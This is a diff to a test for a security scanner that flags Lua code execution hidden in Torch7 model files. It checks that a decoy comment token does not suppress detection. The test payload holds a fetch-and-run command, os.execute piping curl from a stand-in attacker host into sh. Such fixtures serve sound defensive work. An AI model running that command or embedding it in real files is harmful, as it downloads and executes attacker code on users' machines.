@@ -46,7 +46,8 @@ def test_scan_detects_lua_execution_with_network_context(tmp_path: Path) -> None
 
 def test_scan_comment_token_does_not_suppress_lua_execution_detection(tmp_path: Path) -> None:
     payload = (
-        b"T7\x00\x00torch.FloatTensor nn.Sequential\ncmd = os.execute('# curl https://evil.example/payload.sh | sh')\n"
+        b"T7\x00\x00torch.FloatTensor nn.Sequential\n-- decoy comment token\n"
+        b"cmd = os.execute('curl https://evil.example/payload.sh | sh')\n"
     )
     path = _write_torch7_file(tmp_path, payload, filename="malicious-comment.t7")
 
